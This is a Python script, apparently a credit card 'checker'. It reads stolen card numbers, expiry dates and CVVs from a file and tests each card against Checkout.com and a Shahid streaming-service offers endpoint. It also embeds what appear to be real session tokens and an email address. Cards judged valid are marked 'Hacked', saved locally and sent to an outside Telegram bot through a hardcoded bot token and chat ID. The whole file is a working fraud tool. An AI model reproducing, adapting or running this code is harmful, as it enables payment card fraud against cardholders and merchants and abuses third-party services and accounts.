import requests
import os
Z = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'

nno = 'cc.txt'
token = '7454585446:AAE7zE1rH0uXfflyeWWSUJ3MkQ0swGpZLeQ'
ID = '5983253591'

print('=======================')

with open(nno, 'r') as file:
    for line in file.readlines():
        n, mm, yy, cvc = line.strip().split('|')
        six_digits = n[:6]

        
        headers = {
            'authority': 'api.checkout.com',
            'accept': '*/*',
            'accept-language': 'ar;q=0.9',
            'authorization': 'pk_fgdo5tbbbdmdo4e72izmofkimuq',
            'content-type': 'application/json',
            'origin': 'https://js.checkout.com',
            'referer': 'https://js.checkout.com/',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Brave";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        }

        json_data = {
            'type': 'card',
            'number': n,
            'expiry_month': mm,
            'expiry_year': yy,
            'cvv': cvc,
            'billing_address': {
                'country': 'EG',
            },
            'phone': {},
            'preferred_scheme': '',
            'requestSource': 'JS',
        }

        response = requests.post('https://api.checkout.com/tokens', headers=headers, json=json_data)

       
        headers_risk = {
            'authority': 'risk.checkout.com',
            'accept': 'application/json',
            'accept-language': 'ar;q=0.9',
            'authorization': 'pk_fgdo5tbbbdmdo4e72izmofkimuq',
            'content-type': 'application/json',
            'origin': 'https://js.checkout.com',
            'referer': 'https://js.checkout.com/',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Brave";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        }

        json_data_risk = {
            'fp_request_id': '1702560558195.xVBPRD',
            'integration_type': 'RiskJsInFramesJs',
            'card_token': response.json().get('token', ''),
        }

        response_risk = requests.put('https://risk.checkout.com/collect/fingerprint', headers=headers_risk, json=json_data_risk)

        
        headers_shahid = {
            'authority': 'api2.shahid.net',
            'accept': 'application/json',
            'accept-language': 'ar',
            'content-type': 'application/json',
            'country': 'EGY',
            'language': 'AR',
            'origin': 'https://shahid.mbc.net',
            'profile': '{"id":"c4a5a0af-5d33-43be-b592-e1dc135127f9","ageRestriction":false,"master":1}',
            'profile-key': '{"isAdult":true}',
            'referer': 'https://shahid.mbc.net/',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Brave";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'sec-gpc': '1',
            'subscriberid': '09bd2797891a45629934957a08c3e6ed',
            'token': 'eyJhbGciOiJIUzI1NiJ9.eyJjYWNoZSI6IlVzZXJfMDliZDI3OTc4OTFhNDU2Mjk9fX0.7TfN07EWChIdIT33Eq9hHasYyfUIp1bf62vabZnWmQw',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'username': 'top574837@gmail.com',
            'uuid': 'web',
        }

        params_shahid = {
            't': 'undefined',
            'country': 'EG',
        }

        json_data_shahid = {
            'dealId': 'MCD_EGY',
            'productId': 'EGY_B2C_SHAHID_VIP_1M',
            'bin': six_digits,
        }

        response_shahid = requests.post(
            'https://api2.shahid.net/proxy/v2.1/offers/validate-deal-bins',
            params=params_shahid,
            headers=headers_shahid,
            json=json_data_shahid,
        )

        try:
            ii = response_shahid.json()
            print(ii)
        except:
            print('live')

        if "live" in response_shahid.text or "success" in response_shahid.text or "Your card has insufficient funds" in response_shahid.text:
            print(f'{G}Hacked ==> {line.strip()}')
            requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=◆ 𝑪𝑨𝑹𝑫  ➜ {line.strip()}  \n   ◆ 𝑺𝑻𝑨𝑻𝑼𝑺 ➜ 𝑪𝑯𝑨𝑹𝑮𝑬  ✅   \n ◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ 𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 \n  ◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ 𝑨𝑳𝑻𝑬𝑵𝑭𝑿 𝑨𝑵𝑫𝑹𝑶𝑰𝑫𝑺  ━━━━━━━━━━━━━━━━━\n @MAHO_S9')
            with open('VISA.txt', 'a') as x:
                x.write(f'{line.strip()}\n')
        else:
            if "Declined - Call Issuer" in response_shahid.text or "Declinedll Issuer" in response_shahid.text or "Your card was declined" in response_shahid.text or "Your card has expired" in response_shahid.text or "risk_threshold" in response_shahid.text or "Error Processing Payment" in response_shahid.text:
                print(f'{Z}BAD ==> {line.strip()}')
            else:
                print(f'{S}banned ==> {line.strip()}')